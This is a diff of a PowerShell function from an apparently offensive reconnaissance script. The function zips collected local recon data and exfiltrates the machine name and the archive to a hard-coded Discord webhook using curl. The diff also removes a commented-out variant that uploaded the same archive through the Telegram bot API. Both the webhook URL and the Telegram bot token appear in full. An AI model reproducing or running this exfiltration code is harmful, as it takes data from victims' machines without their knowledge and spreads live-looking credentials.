@@ -482,38 +482,10 @@ function pathCheck
 function SendToDiscord{
 
     Compress-Archive -f -Path $global:currentPath\LocalRecon\ -DestinationPath $global:currentPath\LocalRecon.zip
-<#
-    $fileBytes = [System.IO.File]::ReadAllBytes("$global:currentPath\localRecon.zip");
-    $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
-
-    $payload = @{
-        chat_id              = '-776077305'
-        document             = $fileEnc #"$global:currentPath\localRecon.zip"
-        caption              = 'Send by Mindphasr'
-    }
-    
-    $payload.document
-
-    $invokeRestMethodSplat = @{
-        Uri         = ("https://api.telegram.org/bot5327037211:AAE4Ju1kUydrmNGie_bCfHjrAxi1EmCoZWU/sendDocument")
-        Body        = (ConvertTo-Json -Compress -InputObject $payload)
-        ErrorAction = 'Stop'
-        ContentType = "multipart/form-data"
-        Method      = 'Post'
-    }
-    
-    try {
-        Invoke-RestMethod @invokeRestMethodSplat
-    }
-    catch {
-        Write-Error $_
-    }
-#>
-
-$WEBHOOK_URL = "https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn973JOB-KaOnbZflSboYGAgTAqUWUn8Y4fWnvV8ulDIe1zJ7"
-curl.exe -H "Content-Type: application/json" -d '{\"username\": \"test\", \"content\": \"$($env:computername)\"}' $WEBHOOK_URL
-curl.exe -H "Content-Type: multipart/form-data" -F "file1=@localrecon.zip" $WEBHOOK_URL
-#$Body=@{ content = "$env:computername Stats from Mindphasr haxx"};Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn973JOB-KaOnbZflSboYGAgTAqUWUn8Y4fWnvV8ulDIe1zJ7" -Method Post -Body ($Body | ConvertTo-Json);curl.exe -H "accept: application/json" -H  "Content-Type: multipart/form-data" -F "$global:currentPath\LocalRecon.zip"
+    $WEBHOOK_URL = "https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn973JOB-KaOnbZflSboYGAgTAqUWUn8Y4fWnvV8ulDIe1zJ7"
+    curl.exe -H "Content-Type: application/json" -d '{\"username\": \"test\", \"content\": \"$($env:computername)\"}' $WEBHOOK_URL
+    curl.exe -H "Content-Type: multipart/form-data" -F "file1=@localrecon.zip" $WEBHOOK_URL
+    #$Body=@{ content = "$env:computername Stats from Mindphasr haxx"};Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn973JOB-KaOnbZflSboYGAgTAqUWUn8Y4fWnvV8ulDIe1zJ7" -Method Post -Body ($Body | ConvertTo-Json);curl.exe -H "accept: application/json" -H  "Content-Type: multipart/form-data" -F "$global:currentPath\LocalRecon.zip"
 
 }    
 
